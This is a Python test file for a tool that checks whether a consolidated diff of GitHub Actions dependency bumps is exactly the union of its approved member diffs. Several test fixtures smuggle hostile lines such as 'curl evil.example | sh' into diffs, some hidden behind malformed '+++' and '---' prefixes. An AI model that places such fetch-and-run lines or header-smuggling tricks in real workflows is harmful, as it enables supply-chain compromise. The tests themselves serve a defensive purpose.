"""Tests for coupled-set consolidation verification."""

from scripts.security import dep_triage_consolidate as dcon

MEMBER_A = """\
--- a/.github/workflows/codeql.yml
+++ b/.github/workflows/codeql.yml
@@ -1,3 +1,3 @@
-      uses: github/codeql-action/init@aaa # v4.37.9
+      uses: github/codeql-action/init@bbb # v4.38.0
"""

MEMBER_B = """\
--- a/.github/workflows/codeql.yml
+++ b/.github/workflows/codeql.yml
@@ -10,3 +10,3 @@
-      uses: github/codeql-action/analyze@aaa # v4.37.9
+      uses: github/codeql-action/analyze@bbb # v4.38.0
"""


def test_added_lines_extracts_only_additions():
    assert dcon.added_lines(MEMBER_A) == {
        "      uses: github/codeql-action/init@bbb # v4.38.0"
    }


def test_added_lines_ignores_file_headers():
    assert not any("+++" in line for line in dcon.added_lines(MEMBER_A))


def test_verify_union_accepts_exact_union():
    combined = MEMBER_A + MEMBER_B
    ok, missing, extra = dcon.verify_union([MEMBER_A, MEMBER_B], combined)
    assert ok and not missing and not extra


def test_verify_union_rejects_missing_member_change():
    ok, missing, extra = dcon.verify_union([MEMBER_A, MEMBER_B], MEMBER_A)
    assert not ok
    assert "      uses: github/codeql-action/analyze@bbb # v4.38.0" in missing


def test_verify_union_rejects_unexplained_extra_change():
    sneaky = (
        MEMBER_A
        + MEMBER_B
        + ("--- a/x\n+++ b/x\n@@ -1 +1 @@\n+      run: curl evil.example\n")
    )
    ok, missing, extra = dcon.verify_union([MEMBER_A, MEMBER_B], sneaky)
    assert not ok
    assert "      run: curl evil.example" in extra


def test_branch_name_is_slugified():
    assert dcon.branch_name("github/codeql-action", "4.38.0") == (
        "dep-consolidate/github-codeql-action-4.38.0"
    )


def test_added_lines_preserves_indentation():
    """Indentation is semantics in YAML, so it is part of the comparison."""
    diff = (
        "--- a/w.yml\n+++ b/w.yml\n@@ -1 +1 @@\n"
        "+      uses: github/codeql-action/init@bbb # v4.38.0\n"
    )
    assert dcon.added_lines(diff) == {
        "      uses: github/codeql-action/init@bbb # v4.38.0"
    }


def test_verify_union_rejects_a_line_relocated_to_another_indent_level():
    """Re-adding an approved line at a different depth is a different change."""
    member = (
        "--- a/w.yml\n+++ b/w.yml\n@@ -1 +1 @@\n"
        "+      uses: github/codeql-action/init@bbb # v4.38.0\n"
    )
    relocated = (
        "--- a/w.yml\n+++ b/w.yml\n@@ -1 +1 @@\n"
        "+uses: github/codeql-action/init@bbb # v4.38.0\n"
    )
    ok, missing, extra = dcon.verify_union([member], relocated)
    assert not ok
    assert missing and extra


def test_added_lines_reports_content_beginning_with_plus_signs():
    """A `+++`-prefixed raw line is a header only after a `---` line."""
    diff = "--- a/x\n+++ b/x\n@@ -1 +1 @@\n" "+++curl evil.example | sh\n"
    assert dcon.added_lines(diff) == {"++curl evil.example | sh"}


def test_verify_union_rejects_smuggled_plus_prefixed_content():
    sneaky = "--- a/x\n+++ b/x\n@@ -1 +1 @@\n+++curl evil.example | sh\n"
    ok, missing, extra = dcon.verify_union([], sneaky)
    assert not ok
    assert "++curl evil.example | sh" in extra


def test_added_lines_reports_payload_after_a_removed_dashes_line():
    """A removed line starting with dashes must not arm the header skip."""
    diff = (
        "--- a/x\n+++ b/x\n@@ -1,2 +1,2 @@\n"
        "---smuggled-removed-marker\n"
        "+++curl evil.example | sh\n"
    )
    assert dcon.added_lines(diff) == {"++curl evil.example | sh"}


def test_verify_union_rejects_payload_hidden_behind_a_removed_dashes_line():
    diff = (
        "--- a/x\n+++ b/x\n@@ -1,2 +1,2 @@\n"
        "---smuggled-removed-marker\n"
        "+++curl evil.example | sh\n"
    )
    ok, missing, extra = dcon.verify_union([], diff)
    assert not ok
    assert "++curl evil.example | sh" in extra


def test_added_lines_skips_headers_in_a_multi_file_git_diff():
    """Both genuine header pairs are skipped; both added lines are reported."""
    diff = (
        "diff --git a/x.yml b/x.yml\n--- a/x.yml\n+++ b/x.yml\n@@ -1 +1 @@\n"
        "+      first: one\n"
        "diff --git a/y.yml b/y.yml\n--- a/y.yml\n+++ b/y.yml\n@@ -1 +1 @@\n"
        "+      second: two\n"
    )
    assert dcon.added_lines(diff) == {"      first: one", "      second: two"}


def test_added_lines_skips_a_dev_null_header_pair():
    diff = (
        "diff --git a/n.yml b/n.yml\n--- /dev/null\n+++ b/n.yml\n@@ -0,0 +1 @@\n"
        "+      created: yes\n"
    )
    assert dcon.added_lines(diff) == {"      created: yes"}
